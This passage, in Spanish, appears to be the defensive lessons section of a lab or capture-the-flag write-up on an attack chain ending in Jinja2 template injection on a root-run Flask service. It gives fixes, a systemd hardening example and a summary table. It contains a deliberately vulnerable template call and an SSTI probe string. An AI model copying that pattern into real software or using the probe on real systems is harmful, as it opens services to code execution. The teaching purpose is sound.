**El fallo:** el parámetro `name` se concatenaba dentro de la plantilla (`render_template_string(f"Hello, {name}")` o equivalente), de modo que Jinja2 lo **evaluó como código**.

**Lección clave:** separá **plantilla** (estática, de confianza) de **datos** (variables del usuario). El dato entra como *contexto*, nunca como texto de plantilla.

```python
# MAL: el input ES la plantilla
render_template_string(f"Hello, {name}!")      # {{7*7}} → 49 → RCE

# BIEN: plantilla fija, el input va como variable con autoescape
render_template_string("Hello, {{ name }}!", name=name)

# MEJOR: plantilla .html precompilada
render_template("greet.html", name=name)
```

**Defensa en profundidad:** si realmente necesitás que usuarios aporten plantillas, usá un motor *logic-less* (Mustache) o un sandbox real (`jinja2.sandbox.SandboxedEnvironment`). Aun así, el sandbox de Jinja2 ha tenido *bypasses*, por lo que la respuesta correcta sigue siendo **no incrustar input de usuario en plantillas**.

---

## 4. Mínimo privilegio → El multiplicador de daño

**El fallo:** el servicio Flask del puerto 9000 corría como **root**. Por eso un SSTI se convirtió en compromiso total en un solo salto, sin fase de escalada.

**Remediación:** ejecutar el servicio con un usuario dedicado y sin privilegios, con *sandboxing* del init. Con systemd es casi gratis:

```ini
# /etc/systemd/system/music-api.service
[Service]
User=musicapp
Group=musicapp
NoNewPrivileges=true
ProtectSystem=strict      # FS de solo lectura salvo lo necesario
ProtectHome=true
PrivateTmp=true
ReadWritePaths=/opt/musicapp/data
# Idealmente además: contenedor + capabilities mínimas
```

Con esto, el mismo SSTI habría dado una shell como `musicapp`, y recién ahí empezaría una fase de escalada de privilegios.

---

## 5. Lecciones de arquitectura (las que no se ven en un solo fallo)

Estas van más allá de cada bug puntual y son las que más aportan al criterio defensivo:

- **Excessive Data Exposure (OWASP API3):** `/api/users` devolvía el `token` de *todos* los usuarios. Una API jamás debe serializar secretos en la respuesta. Aunque el verb tampering no existiera, devolver tokens ya es un fallo grave por sí mismo.
- **Secretos en el cliente = secretos públicos:** el patrón `/api/users?key=${secretKey}` asume que la key del front es secreta. Todo lo que llega al navegador es visible. La autenticación real se hace con sesiones/tokens server-side, no con una "key mágica" en JavaScript.
- **Broken Object Level Authorization (OWASP API1):** el SSRF usaba `id:18, token:<admin>` sin verificar que ese token corresponde a ese `id` ni que el rol realmente autoriza la acción. La autorización se valida contra la sesión del servidor, no contra parámetros que el cliente controla.
- **Defensa en profundidad:** cada eslabón roto tenía una barrera que lo habría cortado — autorización centralizada (corta el paso 1), allowlist SSRF (corta 2–4), plantillas seguras (corta 5), mínimo privilegio (degrada el impacto final).
- **Monitoreo y *rate limiting*:** un barrido de puertos internos vía SSRF, o cientos de `POST /api/users`, deberían disparar alertas. El *logging* de requests anómalas más un límite de tasa dan tiempo de reacción aunque el bug exista.

---

## Resumen: barrera por vulnerabilidad

| # | Vulnerabilidad | Causa raíz | Barrera que la corta |
|---|----------------|------------|----------------------|
| 1 | HTTP Verb Tampering | Autorización atada a un método | Middleware de autz para todos los verbos; 405 por defecto |
| 2 | SSRF (no ciego) | Fetch a URL controlada por el usuario | Allowlist de destino, bloqueo de rangos internos, sin redirects |
| 3 | SSTI (Jinja2) | Input concatenado en la plantilla | Plantillas estáticas + contexto parametrizado con autoescape |
| 4 | Servicio como root | Proceso con privilegios máximos | Usuario de servicio + systemd sandboxing / contenedor |
| 5 | Exposición de tokens / BOLA | API devuelve secretos y confía en parámetros del cliente | Minimizar datos serializados; autz contra la sesión, no el input |

> **Idea final:** el atacante arma una cadena; el defensor rompe un eslabón. Invertir en *una sola* de estas barreras habría frustrado el camino completo a root.


